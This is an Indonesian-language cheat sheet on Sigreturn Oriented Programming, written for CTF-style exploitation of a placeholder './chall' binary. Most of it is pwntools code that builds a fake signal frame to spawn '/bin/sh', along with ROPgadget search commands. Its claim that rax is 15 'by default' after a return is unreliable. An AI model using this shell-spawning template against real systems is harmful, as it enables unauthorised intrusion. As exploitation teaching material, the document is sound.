#cybersecurity

SROP (Sigreturn Oriented Programming) memanfaatkan syscall `rt_sigreturn` (nomor 15 di x64) untuk **mengontrol semua register sekaligus** lewat signal frame palsu - tanpa perlu gadget `pop rdi; ret` satu per satu.

## Cara kerja

Saat kernel memproses sinyal, ia menyimpan seluruh konteks register ke **signal frame** di stack, lalu memanggil `rt_sigreturn` untuk memulihkannya. Kalau kita bisa memalsukan frame itu, kita bisa set `rip`, `rdi`, `rsp`, `rax`, semuanya.

Syarat: ada gadget **`syscall; ret`** (di binary/libc/vdso).

## Payload

```python
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF("./chall")

syscall_ret = 0x401018   # gadget syscall; ret (dari ROPgadget)
binsh = 0x402004         # alamat "/bin/sh" (di binary atau libc)
# system = libc.sym.system (kalau libc di-leak)

frame = SigreturnFrame()
frame.rip = system        # atau alamat execve / one gadget
frame.rdi = binsh
frame.rsp = 0x0

payload = b"A" * offset
payload += p64(syscall_ret)
payload += bytes(frame)
```

## Aturan frame

```python
frame = SigreturnFrame()
frame.rax = 59        # kalau mau langsung execve (bukan panggil system)
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret   # eksekusi syscall dengan register di atas
```

Ini versi "execve langsung":

```python
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload = b"A"*offset + p64(syscall_ret) + bytes(frame)
# syscall pertama = rt_sigreturn -> restore frame
# syscall kedua (frame.rip) dengan rax=59 -> execve
```

## Kenapa 2 syscall?

1. `syscall` pertama (dari gadget) menjalankan `rt_sigreturn` karena `rax` masih 15 (default setelah ret dari fungsi yang dipanggil syscall) - frame dipulihkan.
2. `frame.rip` menunjuk ke gadget `syscall` lagi, dan `frame.rax = 59` → execve dijalankan dengan register dari frame.

Di beberapa kasus hanya butuh 1 syscall (kalau rax sudah 15).

## Syarat & catatan

1. Ada gadget `syscall; ret` - cari:

```bash
ROPgadget --binary chall | grep syscall
# atau di libc
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "syscall ; ret"
```

2. `SigreturnFrame()` dari pwntools otomatis menyesuaikan arch.
3. SROP sering jadi pilihan saat tidak ada gadget pop (binary minimal).
4. Stack harus punya cukup ruang untuk frame (ukuran frame ±248 byte di 64-bit).
5. Kalau binary punya `syscall` tapi tidak ada "/bin/sh" - taruh "/bin/sh" di `.bss` dulu (pakai read).

## Alur ringkas

```
1. Cari gadget syscall; ret
2. Cari/leak alamat /bin/sh (binary, bss, atau libc)
3. Susun SigreturnFrame dengan rax=59, rdi=/bin/sh, rip=syscall_ret
4. Payload: offset + p64(syscall_ret) + frame
5. Shell!
```
